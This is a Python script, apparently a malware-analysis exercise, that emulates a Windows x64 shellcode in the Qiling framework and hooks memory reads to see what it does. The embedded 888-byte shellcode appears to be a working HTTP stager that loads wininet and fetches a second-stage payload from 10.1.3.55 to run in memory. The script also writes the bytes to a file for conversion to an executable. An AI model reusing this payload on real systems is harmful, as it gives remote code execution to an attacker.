# 脚本路径
# D:\workspace\qiling\examples\qiling_test.py

# 模拟shellcode,看看行为
from qiling import Qiling
from qiling.const import QL_ARCH, QL_OS, QL_VERBOSE
from unicorn.x86_const import *
from colorama import Fore,Back,Style,init


# length: 888 bytes
shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x6c\x7a\x36\x41\x00\x7f\x54\x2d\x90\x5b\xfe\xf3\x83\x7d\xf3\x22\x10\xf7\xeb\x28\xd4\x12\xf5\x4e\x0a\xda\x7a\xa2\x6a\x3d\xb3\xe7\x43\x51\xce\x5d\xde\xf4\x6c\xc2\x08\x54\x5d\x95\x5a\x9f\x09\x8a\xbf\xbe\xa3\x79\xf7\x5c\xe6\xa9\xc7\x6a\xaf\xf8\xe9\xf6\xca\xca\x62\xd2\x71\x7f\x19\xa4\x2a\xe5\xba\x3e\x21\xd2\xd3\x4a\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x37\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x29\x0d\x0a\x00\xb3\xb6\x01\x72\x1d\x18\xb9\x1a\x01\xfa\xea\xe0\x3a\x57\xc5\x1d\x03\xa4\xfd\x5d\x8f\x1e\x91\xa6\xdf\x0e\x5a\x92\x75\x27\xfb\x82\xf1\x5c\xe8\x49\x41\xa4\xf0\x66\x22\x8f\xbb\x9b\xd0\x24\x15\x06\x35\x1a\x0f\x52\xfe\x4a\x2f\x01\x80\x39\xaf\x10\x68\x32\x19\x93\xc4\x91\xf4\x56\xcc\x21\xa7\xc5\x34\xe5\xab\xdd\x26\x54\x0f\x50\x31\x13\xb4\x41\xea\x21\x7f\x65\xb5\xc4\x49\x66\xef\x35\x61\x04\x74\xc0\xf1\xa3\x6e\x5a\x09\xa8\xfc\x84\x00\x7a\x4e\x96\x1e\x54\x37\xd0\xc3\x29\x92\x2c\xd8\x02\x99\x17\x69\x3e\x7d\x97\x00\xec\xad\xcd\x52\x35\x07\x3a\x66\x87\x05\x73\x24\xe3\xf1\x83\x58\x91\x48\x9d\xc5\x6c\x1e\x22\x93\x6e\x3a\xd0\x45\x18\x0c\x4b\x97\x56\x84\xea\x03\x41\x59\x00\x22\xd1\xc8\xe1\xa2\xad\xc5\x3e\x3f\x4f\x64\x0f\x14\x8f\x76\x67\xc8\xac\x9b\xe3\xa3\xb5\x58\xbd\x3d\xb6\x29\xcd\x8a\x8b\xc8\x2e\x16\x88\xec\x3e\xb6\x5b\x5d\xd4\xc2\x8a\x02\xc2\x53\x59\xb7\xed\x28\x84\x65\xc0\xb6\xdb\xa5\xaf\x50\x69\x88\x0c\xb3\x51\x66\xda\xa3\xf0\x22\x09\x3f\xba\x9f\x95\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x2e\x31\x2e\x33\x2e\x35\x35\x00\x3a\xde\x68\xb1"

# D:\workspace\shellcode2exe> .\shellcode2exe.bat ..\qiling\examples\shellcode.bin
f = open('shellcode.bin','wb')
f.write(shellcode)
f.close()

def get1(ql:Qiling) -> None:
    rsi = ql.arch.regs.read('rsi')
    len = ql.arch.regs.read('rcx')
    ba = bytearray()
    
    for i in range(len):
        ba.extend(ql.mem.read(rsi,1))
    print(str(ba))


# windows需要init
init(wrap=True, autoreset=True)
#ql = Qiling(code=shellcode, rootfs=r"rootfs/x86_windows",archtype=QL_ARCH.X8664,ostype=QL_OS.WINDOWS,verbose=QL_VERBOSE.DISASM)
ql = Qiling(code=shellcode, rootfs=r"rootfs/x86_windows",archtype=QL_ARCH.X8664,ostype=QL_OS.WINDOWS,verbose=QL_VERBOSE.DEFAULT)

# setup
ql.hook_address(get1,0x140000030)



ql.run()
